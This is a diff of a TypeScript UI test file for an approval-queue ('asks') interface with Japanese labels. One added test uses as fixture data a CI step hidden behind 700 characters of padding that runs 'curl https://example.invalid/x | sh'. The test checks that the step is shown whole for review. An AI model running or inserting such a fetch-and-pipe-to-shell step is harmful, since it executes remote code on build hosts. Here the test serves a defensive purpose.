@@ -3,11 +3,14 @@ import type { Ask, AskBatch } from "@switchboard/protocol";
 import { createElement } from "react";
 import { renderToStaticMarkup } from "react-dom/server";
 import { AnswerArea } from "./components/Approvals.tsx";
-import { answerButtons, answerRoute, choiceParts, askCardParts, batchLines, questionHead, replyPreview, replyTarget, hiddenByBatches, grantOf, taskAsks, withoutGrant, appliedLine, askFacts, initialPolicyForm, policyInput, policySummary, broadTarget, previousLines, scopeLabel, blockerLines, groupAsks, isQuick, keptAnswers, KIND_LABEL, quickRows, answeredHere, answeredInRow, askRows, rowKey, pruneAnswered, resumeLabel, UNKNOWN_WORKSPACE, issueOpenHref, unblockLinks, unblocksLine, workspaceChips, workspaceSections, type Answered } from "./asks.ts";
+import { t } from "./i18n.ts";
+import { task } from "./i18n/task.ts";
+import { confirmable, settledCount } from "./asks.ts";
+import { answerButtons, answerRoute, choiceParts, askCardParts, batchLines, questionHead, replyPreview, replyTarget, hiddenByBatches, grantOf, taskAsks, withoutGrant, appliedLine, askFacts, initialPolicyForm, policyInput, policySummary, broadTarget, previousLines, scopeLabel, blockerLines, groupAsks, isQuick, keptAnswers, KIND_LABEL, quickRows, answeredHere, answeredInRow, askRows, rowKey, pruneAnswered, resumeLabel, UNKNOWN_WORKSPACE, issueOpenHref, unblockLinks, unblocksLine, waitersLine, waitingLine, workspaceChips, workspaceSections, type Answered } from "./asks.ts";
 
 const ask = (over: Partial<Ask>): Ask => ({
   id: "a", kind: "decision", needs: "person", state: "open", at: 1, changedAt: 1, workspace: null, pbi: null, issue: null, task: null, reason: null, question: null, choices: [], grants: [], grant: null, recommendation: null, next: null,
-  source: { label: "記録", url: null, taskId: null }, route: "none", conditions: [], answers: [], place: null, blockers: [], resume: null, subject: null, policy: { scopes: [], note: null, defaults: null, applied: null, previous: null }, unblocks: [], priority: null, ...over,
+  source: { label: "記録", url: null, taskId: null }, route: "none", conditions: [], answers: [], place: null, blockers: [], resume: null, subject: null, policy: { scopes: [], note: null, defaults: null, applied: null, previous: null }, unblocks: [], waiting: [], priority: null, ...over,
 });
 
 test("groupAsks: the six kinds open, and answered / resolved ones, fall into the three groups in order (answered and resolved share 済んだもの); an empty group is left out", () => {
@@ -31,13 +34,30 @@ test("groupAsks: the six kinds open, and answered / resolved ones, fall into the
   expect(Object.keys(KIND_LABEL).sort()).toEqual(["approval", "check", "confirmation", "decision", "notice", "stop", "wait"]);
 });
 
-test("unblocksLine (#1674): none waiting is null; two say 答えると 2 件が進められる", () => {
+test("unblocksLine: none waiting is null; two say 答えると 2 件が進められる", () => {
   const pbi = (n: number) => ({ number: n, title: `t${n}`, url: `https://github.com/o/r/issues/${n}` });
   expect(unblocksLine(ask({}))).toBeNull();
   expect(unblocksLine(ask({ unblocks: [pbi(20), pbi(21)] }))).toBe("答えると 2 件が進められる");
 });
 
-test("groupAsks keeps the order the API gave within a group (#1674: the person's are ranked by the API, not here)", () => {
+test("waitingLine: a question whose answer does not close its PBI says how many wait for the PBI, never 答えると; one that closes it says 答えると only; both in two languages", () => {
+  const pbi = (n: number) => ({ number: n, title: `t${n}`, url: `https://github.com/o/r/issues/${n}` });
+  const waits = ask({ waiting: [pbi(20), pbi(21)] });
+  const closes = ask({ unblocks: [pbi(20)], waiting: [pbi(30)] });
+  expect(waitingLine(ask({}))).toBeNull();
+  expect(waitersLine(ask({}))).toBeNull();
+  expect(waitingLine(waits)).toBe("この PBI が済むのを待っている 2 件");
+  expect(unblocksLine(waits)).toBeNull();
+  expect(waitersLine(waits)).toBe("この PBI が済むのを待っている 2 件");
+  // one badge: what an answer lets go on wins
+  expect(waitingLine(closes)).toBeNull();
+  expect(waitersLine(closes)).toBe("答えると 1 件が進められる");
+  // the same two in English (the language is fixed when the page loads, so the entries are read directly)
+  expect(t(task.waitingForPbi, { count: 2 }, "en")).toBe("2 waiting for this PBI to be done");
+  expect(t(task.unblocks, { count: 1 }, "en")).toBe("Answering lets 1 more go on");
+});
+
+test("groupAsks keeps the order the API gave within a group (the person's are ranked by the API, not here)", () => {
   const asks = [ask({ id: "few", at: 3 }), ask({ id: "auto", needs: "auto" }), ask({ id: "many", at: 1, unblocks: [{ number: 2, title: "t", url: "u" }] }), ask({ id: "held", state: "held", at: 2 })];
   expect(groupAsks(asks)[0]!.asks.map((a) => a.id)).toEqual(["few", "many", "held"]);
 });
@@ -179,7 +199,7 @@ test("pruneAnswered / keptAnswers: the list replaces an answer it has the questi
   const decision = ask({ id: "decision:ws#3@a", kind: "decision", state: "answered", workspace: { id: "ws", name: "w" }, pbi: { number: 3, title: "p", url: "u" } });
   const changed = ask({ id: "check:t3:4", kind: "check", changedAt: 5 });
   const m = new Map<string, Answered>([[check.id, { ask: check }], [approval.id, { ask: approval }], [decision.id, { ask: decision }], [changed.id, { ask: changed, changes: ["PR #12 の差分が変わりました"], changed: true }]]);
-  // the list: the approval answered (same id), #3 answered under its new id, the check gone, the changed one as it was
+  // the list: the approval answered (same id), `#3` answered under its new id, the check gone, the changed one as it was
   const list = [ask({ id: approval.id, kind: "approval", state: "resolved" }), ask({ id: "decision:ws#3@b", kind: "decision", state: "answered", workspace: { id: "ws", name: "w" }, pbi: { number: 3, title: "p", url: "u" } }), ask({ id: changed.id, kind: "check", changedAt: 5 })];
   const pruned = pruneAnswered(m, list);
   expect([...pruned.keys()].sort()).toEqual([changed.id, check.id].sort());
@@ -273,7 +293,7 @@ test("policy: applied — the summary as one line; null gives none; the form sta
   expect(initialPolicyForm(ask({}))).toBeNull();
 });
 
-test("policy: the expiry day is the JST date, and it ends at 23:59:59 JST whatever the browser's time zone (#2028)", () => {
+test("policy: the expiry day is the JST date, and it ends at 23:59:59 JST whatever the browser's time zone", () => {
   // 2026-10-18T16:00Z is 01:00 JST on 10/19
   const policy = { scopes: ["once" as const, "repo" as const], note: null, defaults: { target: "PR #12", when: [], expiresAt: Date.parse("2026-10-18T16:00:00Z") }, applied: null, previous: null };
   const form = initialPolicyForm(ask({ policy }))!;
@@ -281,7 +301,7 @@ test("policy: the expiry day is the JST date, and it ends at 23:59:59 JST whatev
   expect(policyInput({ ...form, opened: true, scope: "repo" })!.expiresAt).toBe(Date.parse("2026-10-19T14:59:59Z"));
 });
 
-test("grant button: a stop with a grant gets この操作だけ許可して続ける first, sending the grant — to its Issue for a stage Task's (#2745)", () => {
+test("grant button: a stop with a grant gets この操作だけ許可して続ける first, sending the grant — to its Issue for a stage Task's", () => {
   const GRANT = "定期実行 sch_x を POST /api/schedules に登録することだけ許可します";
   const stop = ask({ kind: "stop", answers: ["grant", "text"], grant: GRANT, task: { id: "tk", title: "t" }, next: "Task「t」が続く" });
   const [b] = answerButtons(stop);
@@ -291,7 +311,7 @@ test("grant button: a stop with a grant gets この操作だけ許可して続�
   expect(answerButtons(ask({ kind: "stop", answers: ["text"] }))).toEqual([]);
 });
 
-test("choice grant line: a choice's ` — 許可: ` is its grant, sent with the choice and shown on its own line (#2745)", () => {
+test("choice grant line: a choice's ` — 許可: ` is its grant, sent with the choice and shown on its own line", () => {
   const B = "B: 登録する — 影響: 毎日 PR が出る — 許可: 定期実行 sch_x を登録することだけ許可します";
   expect(grantOf(B)).toBe("定期実行 sch_x を登録することだけ許可します");
   expect(withoutGrant(B)).toBe("B: 登録する — 影響: 毎日 PR が出る");
@@ -301,7 +321,7 @@ test("choice grant line: a choice's ` — 許可: ` is its grant, sent with the 
   expect(a).toMatchObject({ send: "A: 登録しない", grant: null });
 });
 
-test("taskAsks: a Task's screen takes its open checks and the stops a person answers, not another Task's or automatic ones (#2745)", () => {
+test("taskAsks: a Task's screen takes its open checks and the stops a person answers, not another Task's or automatic ones", () => {
   const t = { id: "tk", title: "t" };
   const list = [ask({ id: "c", kind: "check", task: t }), ask({ id: "s", kind: "stop", task: t }), ask({ id: "auto", kind: "stop", needs: "auto", task: t }), ask({ id: "done", kind: "check", state: "answered", task: t }), ask({ id: "other", kind: "check", task: { id: "tk2", title: "u" } }), ask({ id: "ap", kind: "approval", task: t })];
   expect(taskAsks(list, "tk").map((a) => a.id)).toEqual(["c", "s"]);
@@ -331,7 +351,7 @@ test("batch lines and hidden asks", () => {
   expect(hiddenByBatches(mine, [{ ...batch, asks: [], loggingIn: { taskId: "tk_c", title: "C" } }]).map((a) => a.id)).toEqual(["approval:tk_c:p1"]);
 });
 
-test("answerButtons: a scan notice (#2866) is closed by 誤検知として閉じる only", () => {
+test("answerButtons: a scan notice is closed by 誤検知として閉じる only", () => {
   const b = answerButtons(ask({ kind: "notice", answers: ["dismiss"], question: "認証の値の検査: 当たり 1 件 / 検査できなかった 0 リポジトリ" }));
   expect(b.map((x) => [x.label, x.answer])).toEqual([["誤検知として閉じる", { kind: "dismiss" }]]);
   expect(KIND_LABEL.notice).toBe("お知らせ");
@@ -339,7 +359,7 @@ test("answerButtons: a scan notice (#2866) is closed by 誤検知として閉じ
   expect(answerButtons(ask({ kind: "notice", answers: [] }))).toEqual([]);
 });
 
-test("askFacts: a notice (#2866) shows what it is about, why, what to do and what put it there, no PBI / Task / 不明", () => {
+test("askFacts: a notice shows what it is about, why, what to do and what put it there, no PBI / Task / 不明", () => {
   const facts = askFacts(ask({ kind: "notice", question: "workspace app を使えません", reason: "origin は x、登録は y です。", next: "登録のリポジトリの clone にする", source: { label: "workspace の検査", url: null, taskId: null } }));
   expect(facts).toEqual([
     { label: "お知らせ", value: "workspace app を使えません" },
@@ -349,7 +369,7 @@ test("askFacts: a notice (#2866) shows what it is about, why, what to do and wha
   ]);
 });
 
-test("quick: isQuick (#1675) — an approval, a choice with a recommendation and a confirmation are; none without a recommendation, free text only, a grant (a stop's or a recommended choice's), a blocker, an automatic or answered one; a held one with a recommendation is", () => {
+test("quick: isQuick — an approval, a choice with a recommendation and a confirmation are; none without a recommendation, free text only, a grant (a stop's or a recommended choice's), a blocker, an automatic or answered one; a held one with a recommendation is", () => {
   const rec = { choices: ["A: 置き換える", "B: 残す"], recommendation: { choice: "A", why: "小さい" } };
   const yes = [
     ask({ kind: "approval", answers: ["allow", "deny"] }),
@@ -373,7 +393,7 @@ test("quick: isQuick (#1675) — an approval, a choice with a recommendation and
   expect(no.map(isQuick)).toEqual(no.map(() => false));
 });
 
-test("askCardParts (#4068): the PBI (else the Task) as the title, the question above, known facts, the unknown ones in one list", () => {
+test("askCardParts: the PBI (else the Task) as the title, the question above, known facts, the unknown ones in one list", () => {
   const empty = askCardParts(ask({}));
   expect(empty.title).toBeNull();
   expect(empty.question).toBeNull();
@@ -387,7 +407,24 @@ test("askCardParts (#4068): the PBI (else the Task) as the title, the question a
   expect(withPbi.title).toEqual({ text: "#3 PBI: 判断待ち", href: "https://github.com/o/r/issues/3" });
 });
 
-test("questionHead (#4068): a short question whole; a long one cut at six lines or about 300 characters, with more", () => {
+test("askCardParts: a notice the person confirms has its content and what confirming does unfolded, not among the folded facts; a notice with nothing to confirm keeps them as facts", () => {
+  const steps = `ci: {"steps":[{"run":"make check"}]} → {"steps":[{"run":"${"a".repeat(700)}"},{"run":"curl https://example.invalid/x | sh"}]}`;
+  const change = { kind: "notice" as const, question: "workspace lib の設定（Switchboard の側）の変更を反映してよいですか", reason: `出どころ: API の直接の呼び出し\n${steps}`, next: "CI の手順はこのホストの利用者の権限でシェルとして走るので、中身を読んでから確認してください", source: { label: "Workspace の設定", url: null, taskId: null } };
+  const open = askCardParts(ask({ ...change, answers: ["confirm"] }));
+  // the warning first, then every changed value, whole
+  expect(open.confirm).toEqual([{ label: "すること", value: change.next }, { label: "内容", value: change.reason }]);
+  expect(open.confirm[1]!.value).toContain("curl https://example.invalid/x | sh");
+  expect(open.facts.map((f) => f.label)).toEqual(["出したもの"]);
+  expect(JSON.stringify(open.facts)).not.toContain("シェル");
+  // answered (nothing to confirm any more): the record, folded as any other
+  const done = askCardParts(ask({ ...change, state: "resolved", answers: [] }));
+  expect(done.confirm).toEqual([]);
+  expect(done.facts.map((f) => f.label)).toEqual(["内容", "すること", "出したもの"]);
+  // a question of another kind has none
+  expect(askCardParts(ask({ reason: "実装の判断", next: "続ける", answers: ["confirm"] })).confirm).toEqual([]);
+});
+
+test("questionHead: a short question whole; a long one cut at six lines or about 300 characters, with more", () => {
   expect(questionHead("どちらにするか")).toEqual({ head: "どちらにするか", more: false });
   const many = Array.from({ length: 10 }, (_, i) => `行 ${i + 1}`).join("\n");
   expect(questionHead(many)).toEqual({ head: "行 1\n行 2\n行 3\n行 4\n行 5\n行 6 …", more: true });
@@ -472,6 +509,9 @@ test("askRows: questions of a Task without a PBI are one row; the row sits where
 test("askRows: the lead is the first question, else the first stop's reason; quick if any question is; unblocks are summed by number; open if any is open or held", () => {
   const stopOnly = askRows([ask({ id: "s1", kind: "stop", task: { id: "t", title: "T" }, reason: "許可が要る", answers: ["grant"], grant: "g" })]);
   expect(stopOnly[0]!.lead).toBe("許可が要る");
+  // a wait past its limit has no question either: why it is the person's to look at is its reason
+  const over = askRows([ask({ id: "waitover:t:pr#5@9", kind: "wait", task: { id: "t", title: "T" }, reason: "待ちが上限を過ぎた: PR #5 のマージ を 3 時間（上限 2 時間） 待っている" })]);
+  expect(over[0]!.lead).toBe("待ちが上限を過ぎた: PR #5 のマージ を 3 時間（上限 2 時間） 待っている");
   expect(stopOnly[0]!.quick).toBe(false);
   const rows = askRows([
     ask({ id: "slow", kind: "check", pbi: pbiOf(7), answers: ["text"], question: "最初の問い", unblocks: [unblock(1), unblock(2)] }),
@@ -482,6 +522,14 @@ test("askRows: the lead is the first question, else the first stop's reason; qui
   expect(rows[0]!.lead).toBe("最初の問い");
   expect(rows[0]!.quick).toBe(true);
   expect(rows[0]!.unblocks.map((u) => u.number)).toEqual([1, 2, 3]);
+  // the PBIs that only wait for the row's PBI: once each, and not the ones an answer of the row lets go on
+  const waitRows = askRows([
+    ask({ id: "d", kind: "decision", pbi: pbiOf(7), question: "判断", waiting: [unblock(1), unblock(2)] }),
+    ask({ id: "c", kind: "confirmation", pbi: pbiOf(7), question: "確認", unblocks: [unblock(2)], waiting: [] }),
+    ask({ id: "c2", kind: "check", pbi: pbiOf(7), question: "問い", waiting: [unblock(1), unblock(4)] }),
+  ]);
+  expect(waitRows[0]!.unblocks.map((u) => u.number)).toEqual([2]);
+  expect(waitRows[0]!.waiting.map((u) => u.number)).toEqual([1, 4]);
   expect(rows.map((r) => r.open)).toEqual([true, false, true]);
 });
 
@@ -563,4 +611,24 @@ test("reply box: a stage Task's open stop shows its last reply, where the reply 
   expect(blocked).toContain("ランナー側の拒否");
   expect(blocked).not.toContain("返信して続ける");
   expect(blocked).not.toContain("<textarea");
+});
+
+test("proceeding: a question the work went on from is in its own group after the person's, out of the person's count and of すぐ答えられる; answered or settled it is done", () => {
+  const w = { id: "w", name: "alpha" };
+  const going = (over: Partial<Ask>) => ask({ kind: "decision", needs: "auto", proceeding: true, workspace: w, pbi: { number: 7, title: "PBI", url: "u" }, issue: { number: 7, url: "u" }, choices: ["A: 置き換える — 影響: URL はそのまま", "B: 足す"], recommendation: { choice: "A", why: "戻せる" }, answers: ["confirm", "choice", "text"], ...over });
+  const asks = [ask({ id: "mine", workspace: w }), going({ id: "go" }), going({ id: "settled", state: "resolved", answers: [] }), going({ id: "said", state: "answered", answers: [] }), ask({ id: "auto", kind: "wait", needs: "auto", workspace: w })];
+  expect(groupAsks(asks).map((g) => [g.key, g.asks.map((a) => a.id)])).toEqual([["person", ["mine"]], ["proceeding", ["go"]], ["auto", ["auto"]], ["done", ["settled", "said"]]]);
+  expect(groupAsks(asks)[1]!.label).toBe("推奨で進行中（あとで確かめる）");
+  expect(workspaceChips(asks)).toEqual([{ key: "w", name: "alpha", count: 1 }]);
+  expect(isQuick(going({}))).toBe(false);
+  expect(settledCount(asks)).toBe(1);
+  expect(confirmable(asks)).toBe(1);
+  expect(confirmable([going({ recommendation: null })])).toBe(0);
+  // the buttons: the recommendation kept (a confirmation, nothing starts), each other choice as an overturn; no hold
+  expect(answerButtons(going({})).map((b) => [b.label, b.answer, b.primary])).toEqual([
+    ["A: 置き換える のまま", { kind: "confirm", ok: true }, true],
+    ["B: 足す にする", { kind: "choice", choice: "B: 足す" }, false],
+  ]);
+  // a waiting decision keeps its buttons: the recommended choice first, and 保留
+  expect(answerButtons(going({ proceeding: false, needs: "person", answers: ["choice", "text", "hold"] })).map((b) => b.label)).toEqual(["A: 置き換える（推奨）", "B: 足す", "保留"]);
 });
